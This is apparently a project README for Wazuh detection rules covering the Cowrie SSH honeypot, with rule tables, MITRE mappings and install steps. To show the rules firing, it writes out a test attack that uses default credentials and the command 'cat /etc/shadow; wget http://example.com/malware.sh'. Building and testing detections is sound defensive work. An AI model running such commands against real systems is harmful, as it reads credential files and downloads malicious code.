**wazuh-cowrie-ruleset**

[![CI](https://github.com/danishrafiquekhan/wazuh-cowrie-ruleset/actions/workflows/ci.yml/badge.svg)](https://github.com/danishrafiquekhan/wazuh-cowrie-ruleset/actions/workflows/ci.yml)

A Wazuh custom rule set for [Cowrie](https://github.com/cowrie/cowrie), the SSH/Telnet honeypot. Wazuh ships no built-in Cowrie decoder — this fills that gap using Wazuh's generic JSON decoder plus four rules that branch on Cowrie's own `eventid` field.

**Why this exists**

Wazuh has built-in support for a lot of common log sources (MySQL, Suricata, syslog, Windows event channels), but nothing for Cowrie specifically, even though pairing a honeypot with a self-hosted SIEM is a common home-lab and small-team pattern. This is a small, focused rule set for that pairing — not a general-purpose Wazuh add-on, just this one integration, done properly and verified against real attack traffic rather than published untested.

**What it detects**

| Rule ID | Cowrie event | What it means | MITRE |
|---|---|---|---|
| `100041` | `cowrie.login.failed` | A failed login attempt — credential-stuffing/brute-force signal | T1110 |
| `100042` | `cowrie.login.success` | A successful login with a weak/default credential the honeypot accepted | T1078 |
| `100043` | `cowrie.command.input` | A command executed inside Cowrie's fake shell — the attacker is hands-on-keyboard | T1059 |
| `100044` | `cowrie.session.file_download` | An attempted file download onto the honeypot | T1105 |

Rule IDs use the `100000`–`120000` range Wazuh reserves for custom/local rules, chosen to avoid colliding with any other custom rule set you might already have loaded (adjust if you have a conflict — see "Installing" below).

**Verified, real — not just written and hoped**

Every rule here was confirmed firing against a real attack chain, not synthetic test data: `sshpass`-driven SSH sessions against a running Cowrie container (`root/123456` → real failed login → `100041`; `root/toor` → real successful login → `100042`; `cat /etc/shadow; wget http://example.com/malware.sh` once "in" → real command execution → `100043`; the `wget` itself → real file-download attempt → `100044`). `evidence/sample-alerts.json` is the real, unredacted Wazuh alert output from that run — the source IP is Docker's own bridge gateway address, not a real external one, so no redaction was needed.

**Installing**

1. Drop `cowrie_rules.xml`'s contents into `/var/ossec/etc/rules/local_rules.xml` on your Wazuh manager (append, don't replace, if you already have other custom rules there).
2. Add a `<localfile>` stanza pointing at wherever Cowrie writes its JSON log:
```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/cowrie/cowrie.json</location>
</localfile>
```
3. Restart the manager (or just the `wazuh-logcollector` daemon) to pick up the new localfile.
4. Bind-mount Cowrie's log directory into the container/host path referenced above.

**Requirements**

Wazuh 4.x (built against 4.9.2, should work on any 4.x release — the JSON decoder and rule syntax used here haven't changed across that line). Cowrie's default `jsonlog` output engine, which is on by default.

**License**

MIT — use it, modify it, redistribute it.
